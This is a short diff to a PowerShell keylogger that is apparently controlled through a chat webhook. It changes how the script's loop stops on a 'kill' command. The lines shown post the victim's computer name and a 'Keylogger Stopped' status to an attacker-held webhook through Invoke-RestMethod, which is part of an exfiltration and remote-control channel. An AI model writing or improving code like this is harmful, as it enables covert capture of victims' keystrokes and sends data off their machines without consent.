@@ -670,6 +670,7 @@ While ($true){
         $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"} | ConvertTo-Json
         Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
         $previouscmd = $response
+        return 0
         }
     }
     finally{
@@ -684,7 +685,6 @@ While ($true){
     }
 $LastKeypressTime.Restart()
 Start-Sleep -Milliseconds 10
-if ($messages -match "kill") {return 0}
 }
 }
 
